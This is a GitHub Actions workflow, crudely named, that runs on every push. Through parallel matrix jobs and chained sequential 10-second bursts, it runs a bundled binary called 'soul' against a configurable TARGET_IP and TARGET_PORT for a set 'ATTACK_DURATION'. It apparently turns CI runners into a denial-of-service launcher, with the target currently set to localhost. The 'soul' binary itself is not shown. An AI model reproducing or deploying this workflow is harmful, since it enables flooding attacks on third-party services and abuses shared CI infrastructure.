name: soulcrack fucker
on: 
  push:
    branches:
      - '*'

env:
  TARGET_IP: "127.0.0.1"
  TARGET_PORT: "8080"
  ATTACK_DURATION: "400"

jobs:
  stage-0:
    runs-on: ubuntu-22.04
    strategy:
      matrix:
        n: [1, 2, 3, 4, 5]
    steps:
      - name: Checkout code
        uses: actions/checkout@v3
      
      - name: Install cpulimit
        run: |
          sudo apt-get update
          sudo apt-get install -y cpulimit
          
      - name: Run with CPU limit
        run: |
          chmod +x soul
          cpulimit -l 50 -- ./soul ${ env.TARGET_IP } ${ env.TARGET_PORT } 10 400

  stage-1:
    needs: stage-0
    runs-on: ubuntu-22.04
    strategy:
      matrix:
        n: [1, 2, 3, 4, 5]
    steps:
      - name: Checkout code
        uses: actions/checkout@v3
      
      - name: Install cpulimit
        run: |
          sudo apt-get update
          sudo apt-get install -y cpulimit
          
      - name: Run with CPU limit
        run: |
          chmod +x soul
          cpulimit -l 50 -- ./soul ${ env.TARGET_IP } ${ env.TARGET_PORT } ${ env.ATTACK_DURATION } 400

  stage-2-calc:
    runs-on: ubuntu-latest
    outputs:
      matrix_list: ${ steps.calc.outputs.matrix_list }
    steps:
      - name: Calculate matrix
        id: calc
        run: |
          NUM_JOBS=$((${ env.ATTACK_DURATION } / 10))
          ARRAY=$(seq 1 $NUM_JOBS | jq -R . | jq -s -c .)
          echo "matrix_list=$ARRAY" >> $GITHUB_OUTPUT

  stage-2-sequential:
    needs: [stage-0, stage-2-calc]
    runs-on: ubuntu-22.04
    strategy:
      max-parallel: 1
      matrix:
        iteration: ${ fromJSON(needs.stage-2-calc.outputs.matrix_list) }
    steps:
      - name: Checkout code
        uses: actions/checkout@v3
      
      - name: Install cpulimit
        run: |
          sudo apt-get update
          sudo apt-get install -y cpulimit
          
      - name: Sequential 10s Burst with CPU limit
        run: |
          chmod +x soul
          cpulimit -l 50 -- ./soul ${ env.TARGET_IP } ${ env.TARGET_PORT } 10 400
